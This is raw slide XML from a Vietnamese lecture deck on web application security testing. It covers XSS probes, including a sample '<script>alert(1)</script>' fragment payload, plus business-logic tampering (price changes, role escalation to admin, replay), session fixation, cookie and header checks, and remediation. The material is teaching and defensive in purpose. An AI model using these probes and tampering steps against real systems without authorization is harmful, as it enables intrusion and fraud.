              <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="804863" lvl="1"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để kiểm tra phản hồi ngay.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>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Stored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XSS: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hèn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script vào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comment/form </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0">
              <a:buNone/>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để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xem có lưu trữ và thực thi khi người khác truy cập hay không.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DOM-based XSS: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hay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đổi fragment URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(#payload=&lt;script&gt;alert(1)&lt;/script&gt;) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0">
              <a:buNone/>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để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xem script có chạy không.</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6001501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32"/>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1"/>
            <a:ext cx="9928747"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Kiểm tra lỗi logic nghiệp vụ (Business Logic Flaws)</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Bypass quy trình:</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Bỏ qua bước thanh toán nhưng hệ thống vẫn tạo đơn hàng.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Thay đổi giá trị sản phẩm trong request (giảm từ 1,000,000đ xuống 10đ).</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Thay đổi quyền (Privilege Escalation):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Sửa giá trị role trong request/session từ "user" thành "admin".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Truy cập trực tiếp vào URL quản trị /admin mà không cần login.</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Replay Attack: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ửi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lại cùng một request nhiều lần để xem có bị xử lý trùng (double spending) hay không.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29695264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32"/>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1"/>
            <a:ext cx="9928747"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Phân tích Session &amp; Cookie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cookie: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Cookie có flag HttpOnly không (chống XSS đánh cắp session).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Cookie có flag Secure không (chỉ truyền qua HTTPS).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Cookie có thuộc tính SameSite không (giảm CSRF).</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Session Management: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Xem session ID có thể dự đoán được không.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việc hủy session khi logout.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Thử session fixation: ép user dùng session ID cố định.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33009978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32"/>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1"/>
            <a:ext cx="10242645"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thủ công (Manual Testing)</a:t>
            </a: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Phân tích Header HTTP và cấu hình</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có bật Content Security Policy (CSP) không.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Xem có bật X-Frame-Options để chống clickjacking không.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cấu hình CORS (Cross-Origin Resource Sharing) có bị mở quá rộng không (Access-Control-Allow-Origin: *).</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Kết quả mong đợi:</a:t>
            </a:r>
          </a:p>
          <a:p>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Xác định lỗ hổng có thật sự tồn tại và mức độ khai thác.</a:t>
            </a:r>
          </a:p>
          <a:p>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Phát hiện thêm lỗ hổng logic hoặc bảo mật nâng cao mà công cụ tự động không tìm ra.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5217408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461010"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Báo cáo &amp; đề xuất khắc phục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Báo cáo chi tiết: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tả lỗ hổng (mức độ: High/Medium/Low).</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Minh chứng (screenshot, request/response).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Kịch bản tấn công có thể xảy ra.</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Đề xuất giải pháp khắc phục:</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Sửa code (Prepared Statement cho SQLi, escape output cho XSS).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Cấu hình lại server (tắt cổng không cần thiết, cập nhật TLS).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Chính sách an toàn (reset mật khẩu, phân quyền).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lại (Re-test) sau khi vá để đảm bảo lỗ hổng không còn tồn tại.</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647513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58755"/>
            <a:ext cx="10242645" cy="474259"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.7.</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Quy trình kiểm tra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9969691" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" i="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF00FF"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Quy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>trình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kiểm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bảo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ứng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dụng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>phải</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>có</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kế</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hoạch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rõ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ràng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hợp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kiểm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>thử</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>thủ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>báo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cáo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>đầy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>đủ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>theo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dõi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>vá</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lỗi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>là</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>chu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>trình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lặp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>không</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>phải</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hoạt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>động</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>một</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lần</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>duy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nhất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17595253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47943"/>
            <a:ext cx="9901452"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Câu</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hỏi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457200" indent="-457200">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Vì </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>sao mô hình phòng thủ nhiều lớp (Defense in Depth) lại quan trọng hơn so với chỉ sử dụng một công nghệ bảo mật đơn lẻ như Firewall?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Trong thực tế, khi nào nên dùng WAF truyền thống và khi nào cần WAF thế hệ mới tích hợp AI/ML?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Bạn đánh giá như thế nào về vai trò của DevSecOps trong việc giảm thiểu rủi ro bảo mật ứng dụng web?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
